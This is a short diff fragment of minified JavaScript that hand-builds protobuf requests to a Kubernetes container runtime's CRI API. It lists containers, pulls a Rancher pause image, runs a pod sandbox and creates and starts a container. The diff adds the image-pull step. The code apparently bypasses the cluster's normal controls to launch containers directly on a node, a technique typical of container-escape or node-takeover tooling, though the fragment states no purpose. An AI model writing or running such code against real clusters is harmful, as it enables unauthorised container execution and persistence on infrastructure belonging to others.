@@ -15,7 +15,7 @@ const pcfg2=Buffer.concat([pm2, fl(0x12,'zzsb'), fl(0x1a,'/tmp'), Buffer.concat(
 call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
  const all=[...new Set((lb||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/g)||[])];
  if(all.length<2)return; const cid=all[0], sb=all[1]; let sb2=sb;
- call('/runtime.v1.RuntimeService/RunPodSandbox',Buffer.concat([fl(0x0a,pcfg2),fl(0x12,'runc')]),(eR,sbR)=>{ const sm=(sbR||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(sm){ sb2=sm[0] } });
+ call('/runtime.v1.ImageService/PullImage',Buffer.concat([fl(0x0a,Buffer.concat([fl(0x0a,'rancher/mirrored-pause:3.6')]))]),(eP)=>{ call('/runtime.v1.RuntimeService/RunPodSandbox',Buffer.concat([fl(0x0a,pcfg2),fl(0x12,'runc')]),(eR,sbR)=>{ const sm=(sbR||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(sm){ sb2=sm[0] } }); });
  call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb2), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
    const id=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!id)return;
    call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,id[0]),()=>setTimeout(()=>{
